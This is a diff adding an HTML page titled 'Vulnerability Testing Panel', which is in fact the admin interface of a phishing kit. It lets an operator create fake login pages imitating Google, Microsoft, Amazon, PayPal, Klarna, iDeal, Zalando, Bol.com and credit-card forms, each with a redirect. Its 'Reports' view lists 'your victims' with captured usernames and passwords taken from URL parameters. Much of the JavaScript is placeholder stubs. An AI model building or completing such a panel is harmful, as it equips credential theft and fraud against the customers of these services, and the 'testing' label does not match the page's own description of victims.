@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="stylesheet.css">
+    <title>Vulnerability Testing Panel</title>
+</head>
+<body>
+    <header>
+        <h1 class="site-name">Vulnerability Testing Panel</h1>
+    </header>
+
+    <div class="content-wrapper">
+        <nav class="sidebar">
+            <a href="#dashboard">Dashboard</a>
+            <a href="#pages">Pages</a>
+            <a href="#reports">Reports</a>
+            <a href="javascript:void(0);" id="TestLoginLink">Test Login</a>
+        </nav>
+
+    <section class="content" id="dashboard">
+        <h2>Dashboard</h2>
+        <p>This is an overview of your operation.</p>
+        <h3>Pages</h3>
+        <button onclick="createNewPage()">New Page</button>
+        <button onclick="viewMyPages()">My Pages</button>
+        <h4>Recent Reports</h4>
+        <ul class="report-list">
+            <li>Report 1</li>
+            <li>Report 2</li>
+            <li>Report 3</li>
+        </ul>
+        <button onclick="viewAllReports()">See All Reports</button>
+    </section>
+
+    <section class="content" id="pages">
+        <h2>Pages</h2>
+        <p>This menu allows you to create and manage your phishing pages.</p>
+        <h3>Create New Page</h3>
+        <form id="createPageForm">
+            <label for="pageName">Page name</label><br>
+            <input type="text" id="pageName" name="pageName" required><br><br>
+            <label for="pageType">Page type</label><br>
+            <select id="pageType" name="pageType">
+                <option value="Google/Gmail">Google/Gmail</option>
+                <option value="Microsoft">Microsoft</option>
+                <option value="Zalando">Zalando</option>
+                <option value="Bol.com">Bol.com</option>
+                <option value="Amazon">Amazon</option>
+                <option value="iDeal">iDeal</option>
+                <option value="PayPal">PayPal</option>
+                <option value="Klarna">Klarna</option>
+                <option value="Creditcard">Creditcard</option>
+            </select><br><br>
+            <label for="pageRedirect">Redirect to page</label><br>
+            <input type="text" id="pageRedirect" name="pageRedirect" required><br><br>
+            <button type="button" onclick="createPage()">Create Page</button>
+        </form>
+        <h3>My Pages</h3>
+        <ul id="myPagesList">
+            <!-- My Pages will be dynamically added here -->
+        </ul>
+    </section>
+
+    <script>
+        function createPage() {
+            var pageName = document.getElementById("pageName").value;
+            var pageType = document.getElementById("pageType").value;
+            var pageRedirect = document.getElementById("pageRedirect").value;
+
+            if (!isValidURL(pageRedirect)) {
+                alert("Please enter a valid URL for the redirection page.");
+                return;
+            }
+
+            if (pageName.trim() === "") {
+                alert("Please fill in the Page Name field.");
+                return;
+            }
+            var newPage = document.createElement("li");
+            newPage.textContent = pageName + " (" + pageType + ")         ";
+
+            var viewpageButton = document.createElement("button");
+            viewpageButton.textContent = "View Page";
+            viewpageButton.classList.add("fetch-link-button");
+            newPage.appendChild(viewpageButton);
+
+            var fetchLinkButton = document.createElement("button");
+            fetchLinkButton.textContent = "Fetch Link";
+            fetchLinkButton.classList.add("fetch-link-button");
+            newPage.appendChild(fetchLinkButton);
+
+            var deleteButton = document.createElement("button");
+            deleteButton.textContent = "Delete";
+            deleteButton.classList.add("delete-button");
+            deleteButton.onclick = function() {
+                newPage.remove();
+            };
+            newPage.appendChild(deleteButton);
+
+            document.getElementById("myPagesList").appendChild(newPage);
+            document.getElementById("createPageForm").reset();
+
+            }
+
+            function isValidURL(url) {
+            try {
+                new URL(url);
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+    </script>
+
+    <section class="content" id="reports">
+        <h2>Reports</h2>
+        <p>This menu shows an overview of your victims.</p>
+        <div id="reportFeed">
+            <p>Username: <span id="username"></span></p>
+            <p>Password: <span id="password"></span></p>
+        </div>
+    </section>
+
+    <script>
+        var urlParams = new URLSearchParams(window.location.search);
+        var username = urlParams.get('username');
+        var password = urlParams.get('password');
+
+        document.getElementById("username").innerText = username;
+        document.getElementById("password").innerText = password;
+    </script>
+
+    <section class="content" id="test-login">
+        <iframe src="test_login.html" width="100%" height="100%" frameborder="0"></iframe>
+    </section>
+</div>
+
+    <script>
+        document.querySelectorAll('.sidebar a').forEach(link => {
+            link.addEventListener('click', event => {
+                event.preventDefault();
+                var contentId = link.getAttribute('href').substr(1);
+                showContent(contentId);
+                highlightSelected(link);
+            });
+        });
+
+        document.getElementById('TestLoginLink').addEventListener('click', function() {
+            window.open('test_login.html', '_blank');
+        });
+
+        function showContent(contentId) {
+            var contentSections = document.querySelectorAll('.content');
+            contentSections.forEach(function(section) {
+                section.style.display = 'none';
+            });
+            var selectedContent = document.getElementById(contentId);
+            if (selectedContent) {
+                selectedContent.style.display = 'block';
+            }
+        }
+
+        function highlightSelected(link) {
+            var links = document.querySelectorAll('.sidebar a');
+            links.forEach(function(item) {
+                item.classList.remove('highlighted');
+            });
+            link.classList.add('highlighted');
+        }
+
+        function createNewPage() {
+            alert("Creating a new page...");
+        }
+
+        function viewMyPages() {
+            alert("Viewing my pages...");
+        }
+
+        function viewAllReports() {
+            alert("Viewing all reports...");
+        }
+
+        function createNewTemplate() {
+            alert("Creating a new template...");
+        }
+
+        function viewMyTemplates() {
+            alert("Viewing my templates...");
+        }
+    </script>
+
+</body>
+</html>
